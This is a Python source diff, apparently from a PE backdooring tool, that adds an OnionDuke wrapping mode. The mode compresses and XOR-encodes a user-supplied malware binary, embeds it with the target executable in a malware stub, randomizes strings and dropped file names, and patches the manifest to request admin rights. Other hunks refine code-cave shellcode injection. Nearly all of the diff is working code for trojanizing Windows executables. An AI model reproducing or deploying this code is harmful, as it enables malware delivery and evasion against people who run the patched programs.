+                    self.flItms['manifestLOC'] = (self.flItms['rsrcPointerToRawData'] +
+                                                 (self.rsrc_structure[lanID]["RVA of Data"] -
+                                                  self.flItms['rsrcVirtualAddress']))
+
+                    return True
+        return False
 
     def support_check(self):
         """
@@ -968,49 +1177,264 @@ class pebin():
         print "[*] Checking if binary is supported"
         self.flItms['supported'] = False
         #convert to with open FIX
-        self.binary = open(self.FILE, "r+b")
-        if self.binary.read(2) != "\x4d\x5a":
-            print "%s not a PE File" % self.FILE
-            return False
-        if self.gather_file_info_win() is False:
+        with open(self.FILE, "r+b") as self.binary:
+            if self.binary.read(2) != "\x4d\x5a":
+                print "%s not a PE File" % self.FILE
                 return False
-        if self.flItms is False:
+            if self.gather_file_info_win() is False and self.PATCH_METHOD != "onionduke":
+                print "[!] Failure during gathering file info."
+                return False
+            if self.flItms is False:
+                return False
+            if MachineTypes[hex(self.flItms['MachineType'])] not in supported_types:
+                for item in self.flItms:
+                    print item + ':', self.flItms[item]
+                print ("This program does not support this format: %s"
+                       % MachineTypes[hex(self.flItms['MachineType'])])
+            else:
+                self.flItms['supported'] = True
+            targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
+
+            if (self.flItms['Characteristics'] % 0x4000) - 0x2000 > 0 and self.flItms['DllCharacteristics'] > 0 \
+               and self.PATCH_DLL is False:
+                print "[!] DLL patching not enabled"
+                return False
+
+            if self.flItms['Magic'] == int('20B', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
+                #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64':
+                targetFile.pe64_entry_instr()
+            elif self.flItms['Magic'] == int('10b', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):
+                #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32':
+                targetFile.pe32_entry_instr()
+            else:
+                self.flItms['supported'] = False
+
+            if self.flItms['BoundImportSize'] != 0:
+                print "[!] No support for Bound Imports at this time"
+                return False
+
+            if self.RUNAS_ADMIN is True and self.SUPPORT_CHECK is True:
+                self.parse_rsrc()
+                if 'manifestLOC' in self.flItms:
+                    self.flItms['runas_admin'] = self.runas_admin()
+                else:
+                    print '[!] No manifest in rsrc'
+
+            if self.VERBOSE is True:
+                self.print_flItms(self.flItms)
+
+            if self.flItms['supported'] is False:
+                return False
+
+    def onionduke(self):
+
+        if not any(chiptype not in "armv" for chiptype in subprocess.check_output(["uname", "-a"]).lower()):
+            print "[!] Only x86 and x86_64 chipset is supported for OnionDuke due to aPLib support"
             return False
-        if MachineTypes[hex(self.flItms['MachineType'])] not in supported_types:
-            for item in self.flItms:
-                print item + ':', self.flItms[item]
-            print ("This program does not support this format: %s"
-                   % MachineTypes[hex(self.flItms['MachineType'])])
-        else:
-            self.flItms['supported'] = True
-        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
-
-        if self.flItms['Characteristics'] - 0x2000 > 0 and self.PATCH_DLL is False:
+        if 'rsrcSectionName' not in self.flItms:
+            print "[!] Missing rsrc section, not patching bianry"
             return False
 
-        if self.flItms['Magic'] == int('20B', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
-            #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64':
-            targetFile.pe64_entry_instr()
-        elif self.flItms['Magic'] == int('10b', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):
-            #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32':
-            targetFile.pe32_entry_instr()
-        else:
-            self.flItms['supported'] = False
-
-        if self.flItms['BoundImportSize'] != 0:
-            print "[!] No support for Bound Imports at this time"
+        if not self.SUPPLIED_BINARY:
+            print "[!] No malware provided"
             return False
 
-        if self.CHECK_ADMIN is True:
-            self.flItms['runas_admin'] = self.runas_admin()
+        od_stub = cStringIO.StringIO()
 
-        if self.VERBOSE is True:
-            self.print_flItms(self.flItms)
+        stubPath = os.path.dirname(os.path.abspath(onionduke.__file__))
 
-        if self.flItms['supported'] is False:
-            return False
+        #print 'stubPath', stubPath
 
-        self.binary.close()
+        with open(self.FILE, "r+b") as self.binary:
+            #check if OnionDuke Stub
+            self.binary.seek(0x5C0, 0)
+            if self.binary.read(11) == "\x57\xE8\xE4\x10\x00\x00\x8B\x15\x2C\x20\x41":
+                print "[!!!!] Attempting to Patch an OnionDuke wrapped binary"
+                print "[*] Compressing", self.SUPPLIED_BINARY, "with aPLib"
+                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
+                subprocess.check_output(['appack', "c", self.SUPPLIED_BINARY, compressedbin])
+                # key 0x1FE37D3E
+                self.binary.seek(0x413, 0)
+                xor_key1 = struct.unpack("<I", self.binary.read(4))[0]
+
+                self.binary.seek(0x429, 0)
+                xor_key2 = struct.unpack("<I", self.binary.read(4))[0]
+                if xor_key2 == xor_key1:
+                    xorkey = xor_key1
+                    print "[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)
+                    with open(compressedbin, 'r') as compressedBinary:
+                        xorBinary = cStringIO.StringIO()
+                        xor_file(compressedBinary, xorBinary, xorkey)
+                    os.remove(compressedbin)
+                else:
+                    print "[*] Malformed OnionDuke Sample"
+                    return False
+                xorBinary.seek(0)
+                #get size and location of OD malware
+                self.binary.seek(0xfd3c, 0)
+                self.od_begin_malware = struct.unpack("<I", self.binary.read(4))[0]
+                self.binary.seek(0)
+                print "[!] Removing original malware from binary."
+                new_stub = self.binary.read(self.od_begin_malware)
+                new_stub += xorBinary.read()
+                od_stub.write(new_stub)
+                self.od_end_malware = od_stub.tell()
+                self.od_size_malware = xorBinary.tell()
+                print "[*] Appending compressed user supplied binary after target binary"
+                od_stub.seek(0xfd40, 0)
+                od_stub.write(struct.pack("<I", self.od_size_malware))
+                
+            else:
+                od_stub.write(open(stubPath + "/OD_stub.exe", 'r').read())
+                #copy rsrc to memory
+                self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
+                self.rsrc_section = cStringIO.StringIO()
+                print "[*] Copying rsrc section"
+                self.rsrc_section.write(self.binary.read(self.flItms['rsrcSizeRawData']))
+                self.rsrc_section.seek(0)
+                print "[*] Updating", self.FILE, "rsrc section"
+                write_rsrc(self.rsrc_section, self.flItms['rsrcVirtualAddress'], 0x16000)
+                self.rsrc_section.seek(0)
+                self.od_rsrc_begin = od_stub.tell()
+                print "[*] Adding", self.FILE, "rsrc to OnionDuke stub"
+                od_stub.write(self.rsrc_section.read())
+                self.od_binary_begin = od_stub.tell()
+
+                #compress
+                print "[*] Compressing", self.FILE, "with aPLib"
+                #USE Tempfile
+                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
+                subprocess.check_output(['appack', "c", self.FILE, compressedbin])
+
+                xorkey = random.randint(0, 4294967295)
+                print "[*] Xor'ing", self.FILE, "with key:", hex(xorkey)
+                with open(compressedbin, 'r') as compressedBinary:
+                    xorBinary = cStringIO.StringIO()
+                    xor_file(compressedBinary, xorBinary, xorkey)
+                xorBinary.seek(0)
+                print "[*] Appending compressed binary after rsrc section"
+                od_stub.write(xorBinary.read())
+                self.od_begin_malware = od_stub.tell()
+                os.remove(compressedbin)
+
+                print "[*] Compressing", self.SUPPLIED_BINARY, "with aPLib"
+                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
+                subprocess.check_output(['appack', "c", self.SUPPLIED_BINARY, compressedbin])
+
+                print "[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)
+                with open(compressedbin, 'r') as compressedBinary:
+                    xorBinary = cStringIO.StringIO()
+                    xor_file(compressedBinary, xorBinary, xorkey)
+                xorBinary.seek(0)
+                print "[*] Appending compressed user supplied binary after target binary"
+                od_stub.write(xorBinary.read())
+                self.od_end_malware = od_stub.tell()
+                os.remove(compressedbin)
+
+                # update size of image remember to round up the next Section Alignment
+                od_stub.seek(0x138, 0)
+
+                if (0x16000 + self.flItms['rsrcVirtualSize'] % self.flItms['SectionAlignment']) != 0:
+                    size = ((0x16000 + self.flItms['rsrcVirtualSize']) -
+                            ((0x16000 + self.flItms['rsrcVirtualSize']) % self.flItms['SectionAlignment'])
+                            + self.flItms['SectionAlignment']
+                            )
+                else:
+                    size = 0x16000 + self.flItms['rsrcVirtualSize']
+
+                # UPDATE STUB
+                od_stub.write(struct.pack("<I", size))
+                # update Resource Table in optional header SIZE
+                od_stub.seek(0x174, 0)
+                od_stub.write(struct.pack("<I", self.flItms['rsrcSizeRawData']))
+
+                # update .rsrc
+                od_stub.seek(0x288, 0)
+                od_stub.write(struct.pack("<I", self.flItms['rsrcVirtualSize']))
+                od_stub.seek(0x290, 0)
+                od_stub.write(struct.pack("<I", self.flItms['rsrcSizeRawData']))
+
+                #random string in .rdata
+                od_stub.seek(0xD250, 0)
+                od_stub.write(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)
+                              for _ in range(random.randint(6, 12))))
+
+                #random string in .reloc
+                od_stub.seek(0x107F0, 0)
+                od_stub.write(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)
+                              for _ in range(random.randint(6, 12))))
+                # update data section
+                od_stub.seek(0xfc28, 0)
+                od_stub.write(struct.pack("<I", self.od_binary_begin))
+                od_stub.write(struct.pack("<I", self.od_begin_malware - self.od_binary_begin))
+
+            # update xor key in all places (two)
+            od_stub.seek(0x413, 0)
+            od_stub.write(struct.pack("<I", xorkey))
+            od_stub.seek(0x429, 0)
+            od_stub.write(struct.pack("<I", xorkey))
+
+            od_stub.seek(0xfd3c, 0)
+            od_stub.write(struct.pack("<I", self.od_begin_malware))
+            od_stub.write(struct.pack("<I", self.od_end_malware - self.od_begin_malware))
+
+            #update dropped file names
+            od_stub.seek(0xfb20, 0)
+            od_stub.write(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)
+                          for _ in range(random.randint(6, 12))))
+
+            od_stub.seek(0xfc34, 0)
+            _temp_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(4, 8)))
+            _temp_name += ".exe"
+            od_stub.write(_temp_name)
+
+            #randomize Win32 Version Value
+            od_stub.seek(0x134, 0)
+            od_stub.write(struct.pack("<I", random.randint(0, 4294967295)))
+
+        #check submitted file to see if it is a DLL:
+        with open(self.SUPPLIED_BINARY, 'r') as self.binary:
+            print "[?] Checking if user supplied is a DLL"
+            self.gather_file_info_win()
+
+            #Check if DLL
+            if (self.flItms['Characteristics'] % 0x4000) - 0x2000 > 0 and self.flItms['DllCharacteristics'] > 0:
+                print "[!] User supplied malware is a DLL!"
+                print "[*] Patching OnionDuke Stub for DLL usage"
+                self.binary.seek(0)
+                #patch for dll
+                od_stub.seek(0xfd38, 0)
+                od_stub.write("\x01\x00\x00\x00")
+
+                #read within a export location for speed.
+                for section in reversed(self.flItms['Sections']):
+                    if self.flItms['ExportTableRVA'] >= section[2]:
+                        #go to exact export directory location
+                        self.binary.seek((self.flItms['ExportTableRVA'] - section[2]) + section[4])
+                        break
+
+                #read the Image Export Directory for printMessage
+                if 'printMessage' not in self.binary.read(self.flItms['ExportTableSize']):
+                    #use ordinal #1
+                    od_stub.seek(0xfd44, 0)
+                    od_stub.write("\x01\x00\x00\x00")
+            else:
+                print "[*] User supplied malware is not a DLL"
+
+        # write to file
+        od_stub.seek(0)
+        open(self.OUTPUT, 'w').write(od_stub.read())
+        with open(self.OUTPUT, 'r+b') as self.binary:
+            self.gather_file_info_win()
+            if self.RUNAS_ADMIN is True:
+                if self.parse_rsrc() is True:
+                    patch_result = self.patch_runlevel()
+                    if patch_result is False:
+                        print "[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist"
+                else:
+                    print '[!] No manifest in rsrc'
+
+        return True
 
     def patch_pe(self):
 
@@ -1034,6 +1458,16 @@ class pebin():
         if issupported is False:
             return None
 
+        if self.PATCH_METHOD == 'onionduke':
+            print "[!] Attempting OnionDuke patching"
+            # move OS check here.
+            result = self.onionduke()
+            if result:
+                return result
+            else:
+                print "[!] OnionDuke patching failed"
+                return result
+
         self.flItms['NewCodeCave'] = self.ADD_SECTION
         self.flItms['cave_jumping'] = self.CAVE_JUMPING
         self.flItms['CavesPicked'] = {}
@@ -1041,6 +1475,7 @@ class pebin():
         self.flItms['stager'] = False
         self.flItms['supplied_shellcode'] = self.SUPPLIED_SHELLCODE
         self.flItms['CavesToFix'] = {}
+        self.flItms['XP_MODE'] = self.XP_MODE
 
         #pulling apis
         if self.check_shells() is False:
@@ -1054,18 +1489,29 @@ class pebin():
             self.check_apis(self.FILE)
             if self.flItms['neededAPIs'] != set():
                 #ADD new section with IAT here, then patch that binary.
-                self.create_new_iat()
+                iat_result = self.create_new_iat()
+                if iat_result is False:
+                    return False
                 print "[*] Checking updated IAT for thunks"
                 self.check_apis(self.flItms['backdoorfile'])
 
+        if self.set_shells() is False or self.flItms['allshells'] is False:
+            print "[!] Could not set selected shellcode!"
+            return False
+
         self.binary = open(self.flItms['backdoorfile'], "r+b")
 
-        if self.set_shells() is False or self.flItms['allshells'] is False:
-            return False
+        if self.RUNAS_ADMIN is True:
+            if self.parse_rsrc() is True:
+                patch_result = self.patch_runlevel()
+                if patch_result is False:
+                    print "[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist"
+            else:
+                print '[!] No manifest in rsrc'
 
         #reserve space for shellcode
         targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
-        # Finding the length of the resume Exe shellcode
+
         if self.flItms['Magic'] == int('20B', 16):
             _, self.flItms['resumeExe'] = targetFile.resume_execution_64()
         else:
@@ -1108,7 +1554,7 @@ class pebin():
                     print "-resetting shells"
                     self.set_shells()
                     continue
-                elif self.flItms['CavesPicked'].lower() in ['ignore', 'i']:
+                elif self.flItms['CavesPicked'].lower() in ['ignore', 'i', 'q']:
                     #Let's say we don't want to patch a binary
                     return None
             elif self.flItms['CavesPicked'] is None:
@@ -1122,11 +1568,13 @@ class pebin():
         # Assigning code caves to fix
         if self.flItms['CavesPicked'] != {}:
             for cave, values in self.flItms['CavesPicked'].iteritems():
-                self.flItms['CavesToFix'][cave] = [values[6] + 5 + self.flItms['AddressOfEntryPoint'], self.flItms['len_allshells'][cave]]
+                self.flItms['CavesToFix'][cave] = [values[6] + 5 + self.flItms['PatchLocation'], self.flItms['len_allshells'][cave]]
 
         #If no cave found, continue to create one.
         if self.flItms['JMPtoCodeAddress'] is None or self.flItms['NewCodeCave'] is True:
-            self.create_code_cave()
+            create_cave_result = self.create_code_cave()
+            if create_cave_result is False:
+                return False
             self.flItms['NewCodeCave'] = True
             print "- Adding a new section to the exe/dll for shellcode injection"
         else:
@@ -1162,7 +1610,7 @@ class pebin():
             self.binary.write(self.flItms['completeShellcode'])
         if self.flItms['cave_jumping'] is True:
             for i, item in self.flItms['CavesPicked'].iteritems():
-                self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
+                self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16), 0)
                 self.binary.write(self.flItms['allshells'][i])
                 #So we can jump to our resumeExe shellcode
                 if i == (len(self.flItms['CavesPicked']) - 2) and self.flItms['stager'] is False:
